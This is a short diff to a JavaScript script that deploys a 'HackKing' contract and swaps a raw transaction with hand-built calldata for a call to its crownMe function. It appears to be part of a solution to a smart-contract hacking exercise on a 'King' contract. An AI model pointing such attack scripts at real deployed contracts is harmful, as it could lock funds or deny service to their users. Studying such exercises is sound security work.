@@ -13,12 +13,7 @@ const main = async () => {
   await hackKingContract.deployed();
   console.log(`HackKing contract: ${hackKingContract.address}`)
 
-  await wallet.sendTransaction({
-    to: kingContract.address,
-    from: wallet.address,
-    data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000",
-    gasLimit: "100000"
-  });
+  hackKingContract.crownMe(14901166, 100000);
   console.log("Fallback function successfully called.");
 }
 
